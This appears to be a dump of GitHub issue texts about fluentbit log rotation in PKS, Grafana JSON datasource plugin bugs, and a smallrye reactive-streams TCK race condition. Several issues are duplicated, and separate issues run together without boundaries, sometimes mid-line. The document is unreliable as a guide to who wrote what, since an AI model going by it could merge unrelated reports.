The only thing I figured was that the additional integer at the beginning would casue the in_syslog plugin to complain.  That is supposing that the message would start with <prio>.

Thanks,
Miklós Vlasa **Problem description**

We have found the following problem with logs in the `fluentbit` service that comes by default in PKS clusters using the `syslog` output plugin:

1) We execute a test pod that produces logs that are captured by `fluentbit`.
2) The first rotation of the a log for that test pod seems correct, despite the pod generated 123MB in less than 1 minute (clearly excessive, but good for testing this issue).
3) After rotating the first log, the second one started growing, but it is also _reduced its size_. By some reason, `fluentbit` is not properly rotating it, but apparently just overwriting it. By some reason, it only stores the last 2 rotated logs, despite nothing in the configuration seems to define such a limitation.
4) We have reproduced the experiment by updating the image version of `fluentbit` in one PKS cluster to the latest one (`v0.17`), and of course this also happens with the version that comes by default in PKS (`v0.11` and `v0.12`). In all cases we observed the same results.

From inside the `fluentbit` pod, we can see that:
1) The second rotation for the log `xxx-json.log` is growing in size (99MB).
```
root@fluent-bit-ffw5m:/var/vcap/store/docker/docker/containers/f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9# ls -lah
total 221M
drwx------  4 root root 4.0K Mar 15 19:51 .
drwx------ 16 root root 4.0K Mar 15 19:50 ..
drwx------  2 root root 4.0K Mar 15 19:46 checkpoints
-rw-------  1 root root 7.0K Mar 15 19:46 config.v2.json
-rw-r-----  1 root root  99M Mar 15 19:52 f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9-json.log
-rw-r-----  1 root root 123M Mar 15 19:51 f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9-json.log.1
-rw-r--r--  1 root root 2.2K Mar 15 19:46 hostconfig.json
drwx------  2 root root 4.0K Mar 15 19:46 mounts
```
2) Then, it reduces its size (41MB):
```
root@fluent-bit-ffw5m:/var/vcap/store/docker/docker/containers/f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9# ls -lah
total 163M
drwx------  4 root root 4.0K Mar 15 19:52 .
drwx------ 16 root root 4.0K Mar 15 19:50 ..
drwx------  2 root root 4.0K Mar 15 19:46 checkpoints
-rw-------  1 root root 7.0K Mar 15 19:46 config.v2.json
-rw-r-----  1 root root  41M Mar 15 19:52 f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9-json.log
-rw-r-----  1 root root 123M Mar 15 19:52 f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9-json.log.1
-rw-r--r--  1 root root 2.2K Mar 15 19:46 hostconfig.json
drwx------  2 root root 4.0K Mar 15 19:46 mounts
```

3) Then, it grows again (90MB), which indicates that is being continuously overwritten:
```
root@fluent-bit-ffw5m:/var/vcap/store/docker/docker/containers/f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9# ls -lah
total 212M
drwx------  4 root root 4.0K Mar 15 19:52 .
drwx------ 16 root root 4.0K Mar 15 19:50 ..
drwx------  2 root root 4.0K Mar 15 19:46 checkpoints
-rw-------  1 root root 7.0K Mar 15 19:46 config.v2.json
-rw-r-----  1 root root  90M Mar 15 19:52 f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9-json.log
-rw-r-----  1 root root 123M Mar 15 19:52 f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9-json.log.1
-rw-r--r--  1 root root 2.2K Mar 15 19:46 hostconfig.json
drwx------  2 root root 4.0K Mar 15 19:46 mounts
```

Do you have any ideas if there is any problem with `fluentbit` version being used in PKS cluster or its configuration?

**Information for issue reproduction**
This is the configuration of `fluentbit` pod (various files).
```
root@fluent-bit-22sj5:/fluent-bit/etc# cat filter-kubernetes.conf
[FILTER]
    Name                kubernetes
    Match               kube.*
    Kube_URL            https://kubernetes.default.svc.cluster.local:443
    Merge_Log           On
    K8S-Logging.Parser  On
    
    
root@fluent-bit-22sj5:/fluent-bit/etc# cat filters.conf
@INCLUDE filter-kubernetes.conf


root@fluent-bit-22sj5:/fluent-bit/etc# cat fluent-bit.conf
[SERVICE]
    Flush         1
    Log_Level     info
    Daemon        off
    Parsers_File  parsers.conf
    HTTP_Server   On
    HTTP_Listen   0.0.0.0
    HTTP_Port     2020

@INCLUDE inputs.conf
@INCLUDE filters.conf
@INCLUDE outputs.conf


root@fluent-bit-22sj5:/fluent-bit/etc# cat input-forward.conf
[INPUT]
    Name forward
    Port 24225
    Listen localhost
    

root@fluent-bit-22sj5:/fluent-bit/etc# cat input-kubernetes.conf
[INPUT]
    Name              tail
    Tag               kube.*
    Path              /var/log/containers/*.log
    Parser            docker
    DB                /var/log/flb_kube.db
    Mem_Buf_Limit     5MB
    Skip_Long_Lines   On
    Refresh_Interval  10
    

root@fluent-bit-22sj5:/fluent-bit/etc# cat inputs.conf
@INCLUDE input-kubernetes.conf
@INCLUDE input-forward.conf


root@fluent-bit-22sj5:/fluent-bit/etc# cat output-file.conf
[OUTPUT]
    Name file
    Match *
    Path /tmp/output.txt
    

root@fluent-bit-22sj5:/fluent-bit/etc# cat output-null.conf
[OUTPUT]
    Name null
    
    
root@fluent-bit-22sj5:/fluent-bit/etc# cat output-syslog.conf
[OUTPUT]
    Name syslog
    Match *
    Sinks [{\"addr\":\"example.com:12345\"}]
    
    
root@fluent-bit-22sj5:/fluent-bit/etc# cat outputs.conf
@INCLUDE output-null.conf


root@fluent-bit-22sj5:/fluent-bit/etc# cat parsers.conf
[PARSER]
    Name   json
    Format json
    Time_Key time
    Time_Format %d/%b/%Y:%H:%M:%S %z

[PARSER]
    Name        docker
    Format      json
    Time_Key    time
    Time_Format %Y-%m-%dT%H:%M:%S.%L
    Time_Keep   On
    # Command      |  Decoder | Field | Optional Action
    # =============|==================|=================
    Decode_Field_As   escaped    log
```
Some info of a `fluentbit` pod used:
```
Name:               fluent-bit-hjfzj
Namespace:          pks-system
...
Controlled By:      DaemonSet/fluent-bit
Init Containers:
  concat-keystore:
    Container ID:  docker://ed78298ddb59b6e92c3955d3031d8770c6a6b9611de984347d2a53e6c6391570
    Image:         oratos/fluent-bit-out-syslog:v0.11
...
ghostunnel:
    Container ID:  docker://1ce3b8998900c5ae0277b3c3964ac23c132293dbe93b3255f72db54273bc4fd1
    Image:         oratos/ghostunnel:v0.12
```

 Setting the plugin's endpoint to a syslog server, the server could receive data but the data were just messy code.
Any advice? **Problem description**

We have found the following problem with logs in the `fluentbit` service that comes by default in PKS clusters using the `syslog` output plugin:

1) We execute a test pod that produces logs that are captured by `fluentbit`.
2) The first rotation of the a log for that test pod seems correct, despite the pod generated 123MB in less than 1 minute (clearly excessive, but good for testing this issue).
3) After rotating the first log, the second one started growing, but it is also _reduced its size_. By some reason, `fluentbit` is not properly rotating it, but apparently just overwriting it. By some reason, it only stores the last 2 rotated logs, despite nothing in the configuration seems to define such a limitation.
4) We have reproduced the experiment by updating the image version of `fluentbit` in one PKS cluster to the latest one (`v0.17`), and of course this also happens with the version that comes by default in PKS (`v0.11` and `v0.12`). In all cases we observed the same results.

From inside the `fluentbit` pod, we can see that:
1) The second rotation for the log `xxx-json.log` is growing in size (99MB).
```
root@fluent-bit-ffw5m:/var/vcap/store/docker/docker/containers/f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9# ls -lah
total 221M
drwx------  4 root root 4.0K Mar 15 19:51 .
drwx------ 16 root root 4.0K Mar 15 19:50 ..
drwx------  2 root root 4.0K Mar 15 19:46 checkpoints
-rw-------  1 root root 7.0K Mar 15 19:46 config.v2.json
-rw-r-----  1 root root  99M Mar 15 19:52 f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9-json.log
-rw-r-----  1 root root 123M Mar 15 19:51 f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9-json.log.1
-rw-r--r--  1 root root 2.2K Mar 15 19:46 hostconfig.json
drwx------  2 root root 4.0K Mar 15 19:46 mounts
```
2) Then, it reduces its size (41MB):
```
root@fluent-bit-ffw5m:/var/vcap/store/docker/docker/containers/f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9# ls -lah
total 163M
drwx------  4 root root 4.0K Mar 15 19:52 .
drwx------ 16 root root 4.0K Mar 15 19:50 ..
drwx------  2 root root 4.0K Mar 15 19:46 checkpoints
-rw-------  1 root root 7.0K Mar 15 19:46 config.v2.json
-rw-r-----  1 root root  41M Mar 15 19:52 f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9-json.log
-rw-r-----  1 root root 123M Mar 15 19:52 f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9-json.log.1
-rw-r--r--  1 root root 2.2K Mar 15 19:46 hostconfig.json
drwx------  2 root root 4.0K Mar 15 19:46 mounts
```

3) Then, it grows again (90MB), which indicates that is being continuously overwritten:
```
root@fluent-bit-ffw5m:/var/vcap/store/docker/docker/containers/f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9# ls -lah
total 212M
drwx------  4 root root 4.0K Mar 15 19:52 .
drwx------ 16 root root 4.0K Mar 15 19:50 ..
drwx------  2 root root 4.0K Mar 15 19:46 checkpoints
-rw-------  1 root root 7.0K Mar 15 19:46 config.v2.json
-rw-r-----  1 root root  90M Mar 15 19:52 f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9-json.log
-rw-r-----  1 root root 123M Mar 15 19:52 f0b596d30ef4290f4cc2ae006bd7ab47a98194804ae6449a1dae9aaa2e6cf4d9-json.log.1
-rw-r--r--  1 root root 2.2K Mar 15 19:46 hostconfig.json
drwx------  2 root root 4.0K Mar 15 19:46 mounts
```

Do you have any ideas if there is any problem with `fluentbit` version being used in PKS cluster or its configuration?

**Information for issue reproduction**
This is the configuration of `fluentbit` pod (various files).
```
root@fluent-bit-22sj5:/fluent-bit/etc# cat filter-kubernetes.conf
[FILTER]
    Name                kubernetes
    Match               kube.*
    Kube_URL            https://kubernetes.default.svc.cluster.local:443
    Merge_Log           On
    K8S-Logging.Parser  On
    
    
root@fluent-bit-22sj5:/fluent-bit/etc# cat filters.conf
@INCLUDE filter-kubernetes.conf


root@fluent-bit-22sj5:/fluent-bit/etc# cat fluent-bit.conf
[SERVICE]
    Flush         1
    Log_Level     info
    Daemon        off
    Parsers_File  parsers.conf
    HTTP_Server   On
    HTTP_Listen   0.0.0.0
    HTTP_Port     2020

@INCLUDE inputs.conf
@INCLUDE filters.conf
@INCLUDE outputs.conf


root@fluent-bit-22sj5:/fluent-bit/etc# cat input-forward.conf
[INPUT]
    Name forward
    Port 24225
    Listen localhost
    

root@fluent-bit-22sj5:/fluent-bit/etc# cat input-kubernetes.conf
[INPUT]
    Name              tail
    Tag               kube.*
    Path              /var/log/containers/*.log
    Parser            docker
    DB                /var/log/flb_kube.db
    Mem_Buf_Limit     5MB
    Skip_Long_Lines   On
    Refresh_Interval  10
    

root@fluent-bit-22sj5:/fluent-bit/etc# cat inputs.conf
@INCLUDE input-kubernetes.conf
@INCLUDE input-forward.conf


root@fluent-bit-22sj5:/fluent-bit/etc# cat output-file.conf
[OUTPUT]
    Name file
    Match *
    Path /tmp/output.txt
    

root@fluent-bit-22sj5:/fluent-bit/etc# cat output-null.conf
[OUTPUT]
    Name null
    
    
root@fluent-bit-22sj5:/fluent-bit/etc# cat output-syslog.conf
[OUTPUT]
    Name syslog
    Match *
    Sinks [{\"addr\":\"example.com:12345\"}]
    
    
root@fluent-bit-22sj5:/fluent-bit/etc# cat outputs.conf
@INCLUDE output-null.conf


root@fluent-bit-22sj5:/fluent-bit/etc# cat parsers.conf
[PARSER]
    Name   json
    Format json
    Time_Key time
    Time_Format %d/%b/%Y:%H:%M:%S %z

[PARSER]
    Name        docker
    Format      json
    Time_Key    time
    Time_Format %Y-%m-%dT%H:%M:%S.%L
    Time_Keep   On
    # Command      |  Decoder | Field | Optional Action
    # =============|==================|=================
    Decode_Field_As   escaped    log
```
Some info of a `fluentbit` pod used:
```
Name:               fluent-bit-hjfzj
Namespace:          pks-system
...
Controlled By:      DaemonSet/fluent-bit
Init Containers:
  concat-keystore:
    Container ID:  docker://ed78298ddb59b6e92c3955d3031d8770c6a6b9611de984347d2a53e6c6391570
    Image:         oratos/fluent-bit-out-syslog:v0.11
...
ghostunnel:
    Container ID:  docker://1ce3b8998900c5ae0277b3c3964ac23c132293dbe93b3255f72db54273bc4fd1
    Image:         oratos/ghostunnel:v0.12
```


<---------->
138867419
@andig I'd like to mark this repository as normal instead of fork. Eg. when creating PRs, it by default tries to make it to upstream which is kind of annoying

![image](https://user-images.githubusercontent.com/327717/54824421-25466600-4cab-11e9-9c6b-ea82e36a8764.png)

Also then make `master` branch as main one instead of `next`. I do not intend to ever send PR to original repo :) When you select proper fork, it offers `master` branch by default 
![image](https://user-images.githubusercontent.com/327717/54824481-5c1c7c00-4cab-11e9-911b-926061786858.png)

Are you against? 
 @andig I'd like to mark this repository as normal instead of fork. Eg. when creating PRs, it by default tries to make it to upstream which is kind of annoying

![image](https://user-images.githubusercontent.com/327717/54824421-25466600-4cab-11e9-9c6b-ea82e36a8764.png)

Also then make `master` branch as main one instead of `next`. I do not intend to ever send PR to original repo :) When you select proper fork, it offers `master` branch by default 
![image](https://user-images.githubusercontent.com/327717/54824481-5c1c7c00-4cab-11e9-911b-926061786858.png)

Are you against? 
 Hi. I am greatly thankful for your plugin as it allowed me to easily visualize data that would be hardly accessible from grafana other way. Only thing that really makes my effort not easy is a way how you handle variable substitution. Which as now doesn't allow substitution inside of string.

I know there rarely are any easy answers. However wouldn't be it better to stick to how Grafana (eg https://grafana.com/docs/reference/templating/#advanced-formatting-options) handles variable substitution and treat `Additional JSON Data` as plaintext during substitution? It would arguably allow much greater control over how should be variable formatted and/or interpreted.

To illustrate problem I'm trying to tackle, this is example of additional data I use

```json
{
  "sql": "select day, dsp_id, sum(commission) as commission, sum(money) as money from real_commission where day between %(from)s and %(to)s group by day, dsp_id order by day asc",
  "time_field": "day",
  "value_fields": ["commission", "money"],
  "pivot_fields": ["dsp_id"]
}
```

If variable could be put inside of that sql it would save a lot of work. use case: I'm trying to hack a backend with Google Apps Scripts, which uses a redirect mechanism for its web apps It appears I can enter any random URL and the plugin will confirm that the datasource is working.

This makes it nearly impossible to diagnose authentication errors, etc.

![Screen Shot 2019-11-30 at 10 56 55 PM](https://user-images.githubusercontent.com/1708631/69901459-2779cc00-13c5-11ea-9238-0f524ac11df5.png)
 Hi, all!
I'd like to get current logged user name

[dataproxy]
logging = true
send_user_header = true

but I can't write JS backend, pls, help me!!!
```
var express = require('express');
var cors = require('cors')
var app = express();

app.use(cors());

app.get('/', function (req, res) {
	console.log('index: ',req.header('X-Grafana-User'));
  res.send('Hello World!');
});

app.get('/query', function (req, res) {
  console.log('query: ',req.header('X-Grafana-User'));	
  res.status(200);
  res.json({ username: req.header('X-Grafana-User') })
});

app.get('/search', function (req, res) {
	console.log('search: ',req.header('X-Grafana-User'));	
  res.status(200);
  res.json({ username: req.header('X-Grafana-User') })
});

app.listen(3002, function () {
  console.log('Example app listening on port 3002!');
});
``` When `All` variable option is manually selected, `{text: "All", value: "$__all"}` is passed instead of all values. ![screenshot from 2019-03-01 15-23-24](https://user-images.githubusercontent.com/16351306/53644166-38c75980-3c36-11e9-91c2-f2bb8bf9ae4a.png)

I tried using Additional JSON Data but I just got the Error **JSON.parse: unexpected character at line 1 column 13 of the JSON data**

Grafana v5.4.3 Hi, I'm using this plugin as datasource to create template variables on all of my dashboards. After upgrading to 0.1.5 grafana trowed an error "Templating Template variables could not be initialized: e.metricFindQuery is not a function".

I'm creating the issue because I don't know if this is now a excepted behavior or not. Rolled back to 0.1.4 and all errors were gone. Here the error message.

```
Error: Fetch error: 404 Not Found Instantiating 
http://localhost:3000/public/plugins/simpod-json-datasource/module.js \
Loading plugins/simpod-json-datasource/module
```
 Here the error message.

```
Error: Fetch error: 404 Not Found Instantiating 
http://localhost:3000/public/plugins/simpod-json-datasource/module.js \
Loading plugins/simpod-json-datasource/module
```
 ## Problem with search API, per documentation I am passing text and value mapping:
`[ { "text" :"upper_25", "value": 1}, { "text" :"upper_75", "value": 2} ]`

 **But dropdown metric control only shows text?**

 **Where are the values?**
 
![image](https://user-images.githubusercontent.com/6241361/55472862-6c1e4f00-560d-11e9-86d0-96bb99902116.png)
![image](https://user-images.githubusercontent.com/6241361/55472936-9bcd5700-560d-11e9-993d-9b7469b694c2.png)
 Hi,
i'm running Grafana 6.3.2 with InfluxDB 1.7.8 on a Raspberry Pi 3B+ with Raspbian GNU/Linux 10.1 (buster).
On the Pi the web server Apache is running too.

Now i'm trying to get additional data (annotations) via the json datasource into my dashboards.
On the Pi i have created the following files with the static content (for testing) copied from README.md:
`/var/www/html/api/grafana/index.php`:
> (empty file)


`/var/www/html/api/grafana/search/index.php`:
> ["upper_25","upper_50","upper_75","upper_90","upper_95"]


`/var/www/html/api/grafana/query/index.php`:
> [
>   {
>     "target":"pps in",
>     "datapoints":[
>       [622,1450754160000],  // Metric value as a float , unixtimestamp in milliseconds
>       [365,1450754220000]
>     ]
>   },
>   {
>     "target":"pps out",
>     "datapoints":[
>       [861,1450754160000],
>       [767,1450754220000]
>     ]
>   }
>   {
>     "target":"errors out",
>     "datapoints":[
>       [861,1450754160000],
>       [767,1450754220000]
>     ]
>   }
>   {
>     "target":"errors in",
>     "datapoints":[
>       [861,1450754160000],
>       [767,1450754220000]
>     ]
>   }
> ]

`/var/www/html/api/grafana/annotations/index.php`:
> [
>   {
>     "text": "text shown in body",
>     "title": "Annotation Title",
>     "isRegion": true, 
>     "time": "timestamp",
>     "timeEnd": "timestamp",
>     "tags": ["tag1"],
>   }
> ]

In grafana i created the datasource using the url
`http://localhost/api/grafana`

and on my dashboard i have created an annotation by using the json datasource.

When i now refresh my dashboard i get the following error message:
> Annotation Query Failed
{"err":{"data":null,"status":-1,"config":{"method":"POST","transformRequest":[null],"transformResponse":[null],"jsonpCallbackParam":"callback","url":"api/datasources/proxy/8/annotations","data":{"annotation":{"name":"Annotations","datasource":"JSON: Annotations","enable":true,"iconColor":"rgba(255, 96, 96, 1)"},"range":{"from":"2019-09-17T14:59:57.914Z","to":"2019-09-17T15:59:57.914Z","raw":{"from":"now-1h","to":"now"}},"rangeRaw":{"from":"now-1h","to":"now"},"variables":{"__from":{"text":"1568732070837","value":"1568732070837"},"__to":{"text":"1568735670837","value":"1568735670837"}}},"headers":{"Content-Type":"application/json","X-Grafana-Org-Id":1,"X-Grafana-NoCache":"true","Accept":"application/json, text/plain, */*"},"retry":0},"statusText":"","xhrStatus":"error"},"cancelled":true}

Do i have a wrong understanding of how to provide data for the plugin or am i doing something wrong?
Thank you very much! Is it possible to use like this?

{ "var1": "test-${testvar}", "var2": "hello"} Hello, everyone,

I need your help.

Even if I set the timezone to browser, in the call to the query the field "To" is set 1 hour back.

![image](https://user-images.githubusercontent.com/46066876/59506352-4385c180-8ea8-11e9-9a42-970eee4978d8.png)

What can I do? If I set the URL of the JSON Data Source with a parameter:
`https://mywebsite.com/my_json_api?data=mine`
then the parameter is removed and replaced with the relevant action, e.g.:
`https://mywebsite.com/my_json_api/query`

It would be better if the parameter was still included, so:
`https://mywebsite.com/my_json_api/query?data=mine` I'm finding that if I have enough columns in my table to cause it to be larger than the page then the rows of data have a scrollbar which allows you to scroll right but the column titles don't move. This makes it hard to know which column is which and impossible to select columns to the right to index on. I'm finding that if I have enough columns in my table to cause it to be larger than the page then the rows of data have a scrollbar which allows you to scroll right but the column titles don't move. This makes it hard to know which column is which and impossible to select columns to the right to index on. The only way to know this is to try and be disappointed.

Thanks It would be awesome to supply the JSON HTTP Requests with additional HTTP Headers (p.e. send API Keys to other Backends).

Do you think this is a good idea for the plugin?
<---------->
139009007
Otherwise it suggests there's something more general to it.  We run a LOT of batch tests on Liberty which includes smallrye reactive streams operators 1.0.0.

One (only one) of these many test runs threw up:
```java
runAllTckTests:
      java.lang.NullPointerException: Actually not but can't throw other exceptions due to RS
at io.reactivex.Flowable.subscribe(Flowable.java:14645)
at io.reactivex.internal.operators.flowable.FlowableSkipWhile.subscribeActual(FlowableSkipWhile.java:32)
at io.reactivex.Flowable.subscribe(Flowable.java:14636)
at io.reactivex.Flowable.subscribe(Flowable.java:14586)
at io.smallrye.reactive.streams.utils.WrappedProcessor.subscribe(WrappedProcessor.java:26)
at org.reactivestreams.tck.PublisherVerification$11.run(PublisherVerification.java:483)
at org.reactivestreams.tck.PublisherVerification.activePublisherTest(PublisherVerification.java:1138)
at org.reactivestreams.tck.PublisherVerification.required_spec109_mustIssueOnSubscribeForNonNullSubscriber(PublisherVerification.java:477)
at org.reactivestreams.tck.IdentityProcessorVerification.required_spec109_mustIssueOnSubscribeForNonNullSubscriber(IdentityProcessorVerification.java:311)
```
Test is here: https://github.com/reactive-streams/reactive-streams-jvm/blob/master/tck/src/main/java/org/reactivestreams/tck/PublisherVerification.java  
::required_spec109_mustIssueOnSubscribeForNonNullSubscriber
Calling:
```java
    @BackpressureSupport(BackpressureKind.SPECIAL)
    @SchedulerSupport(SchedulerSupport.NONE)
    public final void subscribe(FlowableSubscriber<? super T> s) {
        ObjectHelper.requireNonNull(s, "s is null");
        try {
            Subscriber<? super T> z = RxJavaPlugins.onSubscribe(this, s);

            ObjectHelper.requireNonNull(z, "The RxJavaPlugins.onSubscribe hook returned a null FlowableSubscriber. Please check the handler provided to RxJavaPlugins.setOnFlowableSubscribe for invalid null returns. Further reading: https://github.com/ReactiveX/RxJava/wiki/Plugins");

            subscribeActual(z);
        } catch (NullPointerException e) { // NOPMD
            throw e;
        } catch (Throwable e) {
            Exceptions.throwIfFatal(e);
            // can't call onError because no way to know if a Subscription has been set or not
            // can't call onSubscribe because the call might have set a Subscription already
            RxJavaPlugins.onError(e);

            NullPointerException npe = new NullPointerException("Actually not, but can't throw other exceptions due to RS");  //<<<<<<<<<<<<<<<<<<<   This is the line that trips........lets chase the npe.initCause(e) 'e' done
            npe.initCause(e);
            throw npe;
        }
    }
```
Looking into the Exception in the 'cause' 'e' we see a problem in a Processor's subscribe method call: 

```java
[err] java.lang.IllegalStateException: Illegal transition - subscribe happened in the COMPLETE state
[err]   at io.smallrye.reactive.streams.utils.ConnectableProcessor.subscribe(ConnectableProcessor.java:61)
[err]   at [internal classes]
[err]   at org.reactivestreams.tck.PublisherVerification$11.run(PublisherVerification.java:483)
[err]   at org.reactivestreams.tck.PublisherVerification.activePublisherTest(PublisherVerification.java:1138)
[err]   at org.reactivestreams.tck.PublisherVerification.required_spec109_mustIssueOnSubscribeForNonNullSubscriber(PublisherVerification.java:477)
[err]   at org.reactivestreams.tck.IdentityProcessorVerification.required_spec109_mustIssueOnSubscribeForNonNullSubscriber(IdentityProcessorVerification.java:311)
[err]   at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
```
This is doubly interesting as if it was single threaded it would be logically impossible:
```java
/*[0]*/  if (!state.compareAndSet(State.IDLE, State.HAS_SUBSCRIBER)) {
            // We were not in the idle state, the behavior depends on our current state
            // For failure and completed, we just creates an empty subscription and immediately
            // report the error or completion
            if (state.get() == State.FAILED) {
                manageSubscribeInFailedState(subscriber);
/*[1]*/         } else if (state.get() == State.COMPLETE) {   //<------------------------------------------------------------------- the stage.get().name() in message below comes out as this State.COMPLETE value
                manageSubscribeInCompleteState(subscriber);
            } else if (state.get() == State.HAS_SUBSCRIPTION) {
                manageSubscribeInTheHasSubscriptionState(subscriber);
            } else {
/*[2]*/             throw new IllegalStateException("Illegal transition - subscribe happened in the "  <---------------- Message from here
                        + state.get().name() + " state");
            }
        }
```
So the state is changed to what it looks like what it would tolerate on another thread but the state change is only observed on this thread at [2] and certainly is NOT observable at point [1] as we have gone past the check for the state being State.COMPLETE and failed it, only for the print out of the tested value a few lines below show it would suceed if retested as the state IS now State.COMPLETE.

I understand this is just testing a TCK corner where a completed Subsciber is re-subscribed
once it is finished and the 'correct' behaviour does this: 

   private void manageSubscribeInCompleteState(Subscriber<? super T> subscriber) {
        subscriber.onSubscribe(new EmptySubscription());
        subscriber.onComplete();
    }

public class EmptySubscription implements Subscription {
    @Override
    public void request(long n) {
        // Ignored.
    }

    @Override
    public void cancel() {
        // Ignored.
    }
}

So this is not a problem that will impact customers as far as I can tell - just really picky TCKs!

I will have a rummage about in the code to see if I can see a good fix but not today most likely. I was hoping to pair this library with a custom Reactive Streams implementation targeting Android. However, Android effectively only has JDK7 libraries available. (You can get JDK8 libraries by dropping support for about 35% of devices out there... not super palatable!)

In the section on the Reactive Streams dependency, the spec specifically calls out a desire to remain compatible with JDKs older than 9. Because of use of `CompletionStage`, `Function` and a few others, this actually means only JDK8. Is there any possibility of a version of this library that omits the those dependencies, or uses a vendorerd/shaded equivalent? I was hoping to pair this library with a custom Reactive Streams implementation targeting Android. However, Android effectively only has JDK7 libraries available. (You can get JDK8 libraries by dropping support for about 35% of devices out there... not super palatable!)

In the section on the Reactive Streams dependency, the spec specifically calls out a desire to remain compatible with JDKs older than 9. Because of use of `CompletionStage`, `Function` and a few others, this actually means only JDK8. Is there any possibility of a version of this library that omits the those dependencies, or uses a vendorerd/shaded equivalent? We run a LOT of batch tests on Liberty which includes smallrye reactive streams operators 1.0.0.

One (only one) of these many test runs threw up:
```java
runAllTckTests:
      java.lang.NullPointerException: Actually not but can't throw other exceptions due to RS
at io.reactivex.Flowable.subscribe(Flowable.java:14645)
at io.reactivex.internal.operators.flowable.FlowableSkipWhile.subscribeActual(FlowableSkipWhile.java:32)
at io.reactivex.Flowable.subscribe(Flowable.java:14636)
at io.reactivex.Flowable.subscribe(Flowable.java:14586)
at io.smallrye.reactive.streams.utils.WrappedProcessor.subscribe(WrappedProcessor.java:26)
at org.reactivestreams.tck.PublisherVerification$11.run(PublisherVerification.java:483)
at org.reactivestreams.tck.PublisherVerification.activePublisherTest(PublisherVerification.java:1138)
at org.reactivestreams.tck.PublisherVerification.required_spec109_mustIssueOnSubscribeForNonNullSubscriber(PublisherVerification.java:477)
at org.reactivestreams.tck.IdentityProcessorVerification.required_spec109_mustIssueOnSubscribeForNonNullSubscriber(IdentityProcessorVerification.java:311)
```
Test is here: https://github.com/reactive-streams/reactive-streams-jvm/blob/master/tck/src/main/java/org/reactivestreams/tck/PublisherVerification.java  
::required_spec109_mustIssueOnSubscribeForNonNullSubscriber
Calling:
```java
    @BackpressureSupport(BackpressureKind.SPECIAL)
    @SchedulerSupport(SchedulerSupport.NONE)
    public final void subscribe(FlowableSubscriber<? super T> s) {
        ObjectHelper.requireNonNull(s, "s is null");
        try {
            Subscriber<? super T> z = RxJavaPlugins.onSubscribe(this, s);

            ObjectHelper.requireNonNull(z, "The RxJavaPlugins.onSubscribe hook returned a null FlowableSubscriber. Please check the handler provided to RxJavaPlugins.setOnFlowableSubscribe for invalid null returns. Further reading: https://github.com/ReactiveX/RxJava/wiki/Plugins");

            subscribeActual(z);
        } catch (NullPointerException e) { // NOPMD
            throw e;
        } catch (Throwable e) {
            Exceptions.throwIfFatal(e);
            // can't call onError because no way to know if a Subscription has been set or not
            // can't call onSubscribe because the call might have set a Subscription already
            RxJavaPlugins.onError(e);

            NullPointerException npe = new NullPointerException("Actually not, but can't throw other exceptions due to RS");  //<<<<<<<<<<<<<<<<<<<   This is the line that trips........lets chase the npe.initCause(e) 'e' done
            npe.initCause(e);
            throw npe;
        }
    }
```
Looking into the Exception in the 'cause' 'e' we see a problem in a Processor's subscribe method call: 

```java
[err] java.lang.IllegalStateException: Illegal transition - subscribe happened in the COMPLETE state
[err]   at io.smallrye.reactive.streams.utils.ConnectableProcessor.subscribe(ConnectableProcessor.java:61)
[err]   at [internal classes]
[err]   at org.reactivestreams.tck.PublisherVerification$11.run(PublisherVerification.java:483)
[err]   at org.reactivestreams.tck.PublisherVerification.activePublisherTest(PublisherVerification.java:1138)
[err]   at org.reactivestreams.tck.PublisherVerification.required_spec109_mustIssueOnSubscribeForNonNullSubscriber(PublisherVerification.java:477)
[err]   at org.reactivestreams.tck.IdentityProcessorVerification.required_spec109_mustIssueOnSubscribeForNonNullSubscriber(IdentityProcessorVerification.java:311)
[err]   at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
```
This is doubly interesting as if it was single threaded it would be logically impossible:
```java
/*[0]*/  if (!state.compareAndSet(State.IDLE, State.HAS_SUBSCRIBER)) {
            // We were not in the idle state, the behavior depends on our current state
            // For failure and completed, we just creates an empty subscription and immediately
            // report the error or completion
            if (state.get() == State.FAILED) {
                manageSubscribeInFailedState(subscriber);
/*[1]*/         } else if (state.get() == State.COMPLETE) {   //<------------------------------------------------------------------- the stage.get().name() in message below comes out as this State.COMPLETE value
                manageSubscribeInCompleteState(subscriber);
            } else if (state.get() == State.HAS_SUBSCRIPTION) {
                manageSubscribeInTheHasSubscriptionState(subscriber);
            } else {
/*[2]*/             throw new IllegalStateException("Illegal transition - subscribe happened in the "  <---------------- Message from here
                        + state.get().name() + " state");
            }
        }
```
So the state is changed to what it looks like what it would tolerate on another thread but the state change is only observed on this thread at [2] and certainly is NOT observable at point [1] as we have gone past the check for the state being State.COMPLETE and failed it, only for the print out of the tested value a few lines below show it would suceed if retested as the state IS now State.COMPLETE.

I understand this is just testing a TCK corner where a completed Subsciber is re-subscribed
once it is finished and the 'correct' behaviour does this: 
```java
   private void manageSubscribeInCompleteState(Subscriber<? super T> subscriber) {
        subscriber.onSubscribe(new EmptySubscription());
        subscriber.onComplete();
    }

public class EmptySubscription implements Subscription {
    @Override
    public void request(long n) {
